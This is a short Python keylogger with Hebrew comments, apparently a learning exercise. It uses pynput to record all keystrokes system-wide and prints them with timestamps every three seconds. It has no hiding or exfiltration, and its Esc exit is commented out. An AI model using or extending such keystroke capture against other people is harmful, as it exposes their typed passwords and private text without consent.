#פונקציה שלוכדת מקשים
from pynput.keyboard import Listener, Key
# פונקציה של זמן
from datetime import datetime
#פונקציה לשמירה
import threading

# משתנה לשמירת המקשים שנלחצו
keystring = []

# פונקציית שמירה
def report():
    if keystring:
        #מדפיס שעה ותאריך
        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]")
        #מדפיס מחרוזת רציפה מכל התווים שנשמרו
        print(''.join(keystring))
    # קריאה חוזרת כל כמות שניות
    threading.Timer(3, report).start()

# פונקציית האזנה למקשים
def on_press(key):
    try:
        # ברגע שנלחץ Esc האזנה תפסיק
        if key == Key.esc:
            print("Esc was pressed — exiting...")
            # return

        else:
            keystring.append(key.char)
    except AttributeError:
        keystring.append(f"[{key}]")

# התחלת ההדפסה המחזורית
report()

# התחלת האזנה
with Listener(on_press=on_press) as listener:
    listener.join()
